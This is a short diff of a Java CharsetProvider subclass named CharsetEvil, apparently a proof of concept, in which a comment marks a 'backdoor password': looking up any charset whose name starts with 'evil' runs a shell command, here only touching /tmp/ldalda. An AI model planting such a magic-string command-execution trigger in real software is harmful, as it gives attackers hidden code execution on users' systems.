@@ -35,7 +35,9 @@ public class CharsetEvil extends CharsetProvider{
         // TODO Auto-generated method stub
         if(charsetName.startsWith("evil")) {    //指定后门密码
             try {
-                Runtime.getRuntime().exec("/bin/bash -c 'touch /tmp/ldalda'");
+                Runtime.getRuntime().exec(new String[]{
+                "/bin/sh", "-c", "touch /tmp/ldalda"
+            });
             } catch (IOException e) {
                 // TODO Auto-generated catch block
                 e.printStackTrace();
